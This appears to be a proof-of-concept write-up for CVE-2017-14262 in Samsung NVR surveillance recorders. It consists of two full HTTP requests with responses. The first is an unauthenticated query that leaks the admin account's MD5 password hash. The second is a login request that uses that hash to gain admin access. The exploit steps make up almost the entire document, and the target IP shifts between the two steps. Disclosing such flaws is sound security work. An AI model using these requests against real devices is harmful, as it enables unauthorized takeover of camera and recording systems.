# Samsung_NVR_vul

## CVE-2017-14262
## xfuturesec Co., Ltd

### First, get the MD5 hash password of the 'admin' account.

Send:  
GET http://192.168.1.14/cgi-bin/main-cgi?json={"cmd":201,"szUserName_Qry":"admin","szUserName":"","u32UserLoginHandle":0} HTTP/1.1  
Host: 192.168.1.14  
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0  
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3  
Accept-Encoding: gzip, deflate  
X-Requested-With: XMLHttpRequest  
Connection: keep-alive  

Recv:  
HTTP/1.1 200 OK  
Content-Type: text/html;CHARset=utf-8  

{  
	"szUserName":	"",  
	"szLoginPasswd":	"e10adc3949ba59abbe56e057f20f883e",  
	"au32LoginPasswd":	[13423221, 5515125, 6390751, 4733341, 12838108, 13423221, 5515125, 6390751, 10132668, 371291, 12838108, 13423221, 5515125, 10132668, 371291, 13423221, 10132668, 371291, 0, 0],  
	"u16UserPermissionCnt":	1,  
	"u8UserRole":	0,  
	"u8UserBasePermission":	255,  
	"u16UserExtralPermissionCnt":	1,  
	"u32UserLivePermission":	[4294967295],  
	"u32UserPTZPermission":	[4294967295],  
	"u32UserVODPermission":	[4294967295],  
	"u32UserRecordPermission":	[4294967295],  
	"u32UserLocalBackup":	[4294967295], 
	"code":	0,  
	"success":	true  
}  

"szLoginPasswd":	"e10adc3949ba59abbe56e057f20f883e" is the MD5 hash password of 'admin' account.  

Now, we have the MD5 hash password.


### Second, log in to the device with that MD5 hash.

Send:  

POST http://192.168.1.100/cgi-bin/main-cgi HTTP/1.1  
Accept: text/html, application/xhtml+xml, */*  
Referer: http://192.168.1.100/  
Accept-Language: zh-CN  
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko  
Content-Type: application/x-www-form-urlencoded  
Accept-Encoding: gzip, deflate  
Connection: Keep-Alive  
Content-Length: 246  
DNT: 1  
Host: 192.168.1.100  
Pragma: no-cache  

lLan=0&szUserName=admin&szUserPasswd=e10adc3949ba59abbe56e057f20f883e&szUserPasswdEx=%5B6477625%2C24215867%2C12838108%2C11382568%2C7503741%2C7198498%2C24215867%2C7503741%2C7198498%2C23345327%2C7198498%2C10192199%2C23345327%2C7198498%2C10192199%5D

szUserPasswd=e10adc3949ba59abbe56e057f20f883e is the MD5 hash password we read from the first step.

Now, we log in to the device with 'admin' account.
